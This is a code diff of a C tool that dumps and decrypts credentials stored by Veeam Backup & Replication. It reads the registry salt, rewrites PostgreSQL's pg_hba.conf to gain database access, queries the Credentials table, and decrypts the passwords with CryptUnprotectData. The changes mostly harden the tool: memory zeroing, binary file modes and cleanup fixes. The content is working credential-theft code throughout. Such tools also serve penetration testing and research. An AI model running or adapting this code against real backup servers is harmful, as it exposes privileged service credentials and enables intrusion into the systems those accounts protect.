@@ -14,14 +14,15 @@
 #include <wincrypt.h>
 
 /* Change these if needed */
-#define PG_ROOT_PATH      "C:\\Program Files\\PostgreSQL\\15" /* Path to PostgreSQL install */
-#define PG_USERNAME       "postgres"                          /* Username to connect to the Veeam database as */
-#define PG_HOST           "localhost"                         /* Host of the PostgreSQL database (rarely needs changing) */
-#define PG_DATABASE       "VeeamBackup"                       /* Database name of the Veeam Credential store */
+#define PG_ROOT_PATH                "C:\\Program Files\\PostgreSQL\\15" /* Path to PostgreSQL install */
+#define PG_USERNAME                 "postgres"                          /* Username to connect to the Veeam database as */
+#define PG_HOST                     "localhost"                         /* Host of the PostgreSQL database (rarely needs changing) */
+#define PG_DATABASE                 "VeeamBackup"                       /* Database name of the Veeam Credential store */
 
-#define VEEAM_SALT_ROOT   HKEY_LOCAL_MACHINE
-#define VEEAM_SALT_SUBKEY "SOFTWARE\\Veeam\\Veeam Backup and Replication\\Data" /* Registry key path of the EncryptionSalt key */
-#define VEEAM_SALT_KEY    "EncryptionSalt"
+#define VEEAM_SALT_ROOT             HKEY_LOCAL_MACHINE
+#define VEEAM_SALT_SUBKEY           "SOFTWARE\\Veeam\\Veeam Backup and Replication\\Data" /* Registry key path of the EncryptionSalt key */
+#define VEEAM_SALT_KEY              "EncryptionSalt"
+#define VEEAM_ENCRYPTION_HEADER_LEN 37 /* 37 is the length of the header in Veeam's encrypted strings which we later discard */
 
 #define SHOW_DESCRIPTION 0 /* Output the PostgreSQL "description" column to stdout */ 
 
@@ -113,7 +114,7 @@ static size_t vb_path(char *md, const char *root, const char *path, size_t len) 
 }
 
 static size_t vb_read_file(char **md, const char *path) {
-  FILE *fptr = fopen(path, "r");
+  FILE *fptr = fopen(path, "rb");
   if (!fptr)
     return 0;
 
@@ -122,8 +123,13 @@ static size_t vb_read_file(char **md, const char *path) {
   len = ftell(fptr);
   rewind(fptr);
 
+  if (len <= 0) {
+    fclose(fptr);
+    return 0;
+  }
+
   *md = (char*)malloc(len + 1);
-  if (!md)
+  if (!(*md))
     return 0;
 
   memset(*md, 0, len + 1);
@@ -135,7 +141,7 @@ static size_t vb_read_file(char **md, const char *path) {
 }
 
 static size_t vb_write_file(const char *path, const char *contents, size_t len) {
-  FILE *fptr = fopen(path, "w");
+  FILE *fptr = fopen(path, "wb");
   if (!fptr)
     return 0;
 
@@ -210,13 +216,27 @@ struct vb_credential *vb_credential_add(struct vb_credential *vbc,
     return NULL;
 
   new->user_name = strdup(user_name);
-  new->password = strdup(password);
-  new->description = strdup(description);
-  new->plaintext = NULL;
-
-  if (!new->user_name || !new->password || !new->description)
+  if (!new->user_name) {
+    free(new);
     return NULL;
+  }
 
+  new->password = strdup(password);
+  if (!new->password) { 
+    free(new->user_name);
+    free(new);
+    return NULL;
+  }
+
+  new->description = strdup(description);
+  if (!new->description) {
+    free(new->user_name);
+    free(new->password);
+    free(new);
+    return NULL;
+  }
+
+  new->plaintext = NULL;
   new->next = NULL;
 
   if (!vbc)
@@ -241,18 +261,20 @@ DWORD vb_credential_decrypt(struct vb_credential *vbc, unsigned char *enc_salt) 
 
   unsigned char *dec_salt, *dec_password;
   DWORD dec_salt_len, dec_password_len;
-  if (!(dec_salt_len = vb_base64_decode(enc_salt, &dec_salt)) || 
-      !(dec_password_len = vb_base64_decode(vbc->password, &dec_password)))
+  if (!(dec_salt_len = vb_base64_decode((const char*)enc_salt, &dec_salt)) || 
+      !(dec_password_len = vb_base64_decode((const char*)vbc->password, &dec_password)))
     return 0;
 
-  if (dec_password_len <= 37) { /* 37 is the length of the context header, which we discard */
+  if (dec_password_len <= VEEAM_ENCRYPTION_HEADER_LEN) {
+    SecureZeroMemory(dec_salt, dec_salt_len);
+    SecureZeroMemory(dec_password, dec_password_len);
     free(dec_salt);
     free(dec_password);
     return 0;
   }
 
-  unsigned char *ctx = dec_password + 37;
-  dec_password_len -= 37;
+  unsigned char *ctx = dec_password + VEEAM_ENCRYPTION_HEADER_LEN;
+  dec_password_len -= VEEAM_ENCRYPTION_HEADER_LEN;
 
   DATA_BLOB in_blob, entropy_blob, out_blob;
   in_blob.pbData = ctx;
@@ -264,19 +286,35 @@ DWORD vb_credential_decrypt(struct vb_credential *vbc, unsigned char *enc_salt) 
   memset(&out_blob, 0, sizeof(out_blob));
 
   if (!CryptUnprotectData(&in_blob, NULL, &entropy_blob, NULL, NULL, CRYPTPROTECT_LOCAL_MACHINE, &out_blob)) {
+    SecureZeroMemory(dec_salt, dec_salt_len);
+    SecureZeroMemory(dec_password, dec_password_len);
     free(dec_salt);
     free(dec_password);
     return 0;
   }
 
   vbc->plaintext = (char*)malloc(out_blob.cbData + 1);
-  if (!vbc->plaintext)
+  if (!vbc->plaintext) {
+    SecureZeroMemory(&in_blob, sizeof(in_blob));
+    SecureZeroMemory(&out_blob, sizeof(out_blob));
+    SecureZeroMemory(&entropy_blob, sizeof(entropy_blob));
+    SecureZeroMemory(dec_salt, dec_salt_len);
+    SecureZeroMemory(dec_password, dec_password_len);
+    LocalFree(out_blob.pbData);
+    free(dec_salt);
+    free(dec_password);
     return 0;
+  }
 
   memset(vbc->plaintext, 0, out_blob.cbData + 1);
-  strncpy(vbc->plaintext, out_blob.pbData, out_blob.cbData);
+  memcpy(vbc->plaintext, out_blob.pbData, out_blob.cbData); /* memcpy to avoid NULL bytes */
 
-  free(out_blob.pbData);
+  SecureZeroMemory(&in_blob, sizeof(in_blob));
+  SecureZeroMemory(&entropy_blob, sizeof(entropy_blob));
+  SecureZeroMemory(&out_blob, sizeof(out_blob));
+  SecureZeroMemory(dec_salt, dec_salt_len);
+  SecureZeroMemory(dec_password, dec_password_len);
+  LocalFree(out_blob.pbData);
   free(dec_salt);
   free(dec_password);
 
@@ -295,7 +333,7 @@ int vb_libpq_map(libpq_t *pq, char *out_path, size_t out_len) {
                                                       so we must add these to the DLL directory before
                                                       attempting to load libpq.dll */
   if (!SetDllDirectory(out_path))
-    return -1;
+    return GetLastError();
 
   /* Once the DLL directory has been set for deps, we can attempt to load libpq.dll */
   vb_path(out_path, out_path, "libpq.dll", out_len);
@@ -328,6 +366,7 @@ int vb_libpq_connect(libpq_t *pq) {
   if (!pq || !pq->PQconnectdb || !pq->PQstatus)
     return 0;
 
+  /* Base allocation of 64 for safe buffer */
   char cs[64 + strlen(PG_HOST) + strlen(PG_DATABASE) + strlen(PG_USERNAME)];
   memset(cs, 0, sizeof(cs));
   snprintf(cs, sizeof(cs),
@@ -364,7 +403,7 @@ int vb_data_pg_hba_overwrite(vb_data_t *vb_data) {
   if (!(vb_data->pg_hba_len = vb_read_file(&vb_data->pg_hba_orig, vb_data->pg_hba_path)))
     return 0;
 
-  size_t config_len = 128 + (strlen(PG_DATABASE) * 2) + (strlen(PG_USERNAME) * 2);
+  size_t config_len = 128 + (strlen(PG_DATABASE) * 2) + (strlen(PG_USERNAME) * 2); /* 128 for enough buffer for base config length */
   vb_data->pg_hba_config = (char*)malloc(config_len);
   if (!vb_data->pg_hba_config)
     return 0;
@@ -382,7 +421,7 @@ int vb_data_pg_hba_overwrite(vb_data_t *vb_data) {
   if (!CopyFile(vb_data->pg_hba_path, vb_data->pg_hba_path_copy, FALSE)) /* FALSE sets overwrite flag */
     return 0;
 
-  if (!vb_write_file(vb_data->pg_hba_path, vb_data->pg_hba_config, config_len))
+  if (!vb_write_file(vb_data->pg_hba_path, vb_data->pg_hba_config, strlen(vb_data->pg_hba_config)))
     return 0;
 
   return 1;
@@ -418,8 +457,6 @@ int vb_get_credentials(libpq_t *pq, struct vb_credential **vbc) {
   if (!pq || !pq->PQexec || !pq->PQresultStatus || !pq->PQntuples)
     return 0;
 
-  /* Update this if more columns are added in the query! */
-  int cols = 3;
   pq->res = pq->PQexec(pq->conn, "SELECT user_name,password,description FROM Credentials");
 
   if ((int)pq->PQresultStatus(pq->res) != PG_RES_TUPLE_OK)
